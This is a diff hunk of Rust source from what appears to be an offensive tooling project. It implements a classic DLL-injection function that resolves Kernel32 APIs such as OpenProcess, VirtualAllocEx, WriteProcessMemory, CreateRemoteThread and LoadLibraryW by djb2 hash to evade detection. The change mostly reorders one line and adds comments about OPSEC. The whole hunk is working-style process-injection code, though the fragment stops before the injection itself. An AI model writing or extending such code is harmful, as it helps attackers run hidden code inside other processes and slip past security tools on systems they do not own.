@@ -29,9 +29,13 @@ pub unsafe fn classic_dll_injection(pid: u32, dll_path: &str) -> Result<(), Box<
     // Get function pointers
     let open_process_ptr: FnOpenProcess = addr_to_func_ptr!(resolve_api(djb2!("OpenProcess"), "Kernel32.dll")?, FnOpenProcess);
     let virtual_alloc_ex_ptr: FnVirtualAllocEx = addr_to_func_ptr!(resolve_api(djb2!("VirtualAllocEx"), "Kernel32.dll")?, FnVirtualAllocEx);
-    let close_handle_ptr: FnCloseHandle = addr_to_func_ptr!(resolve_api(djb2!("CloseHandle"), "Kernel32.dll")?, FnCloseHandle);
     let write_process_memory_ptr: FnWriteProcessMemory = addr_to_func_ptr!(resolve_api(djb2!("WriteProcessMemory"), "Kernel32.dll")?, FnWriteProcessMemory);
     let create_remote_thread_ptr: FnCreateRemoteThread = addr_to_func_ptr!(resolve_api(djb2!("CreateRemoteThread"), "Kernel32.dll")?, FnCreateRemoteThread);
+
+    // Not for OPSEC, but rather to be able to directly interact with our handle
+    let close_handle_ptr: FnCloseHandle = addr_to_func_ptr!(resolve_api(djb2!("CloseHandle"), "Kernel32.dll")?, FnCloseHandle);
+
+    // Not for OPSEC, but to get the function address to send to the thread we will later create
     let start_routine: PthreadStartRoutine = addr_to_func_ptr!(resolve_api(djb2!("LoadLibraryW"), "Kernel32.dll")?, PthreadStartRoutine);
 
     let dll_path_w = to_wstring(dll_path);
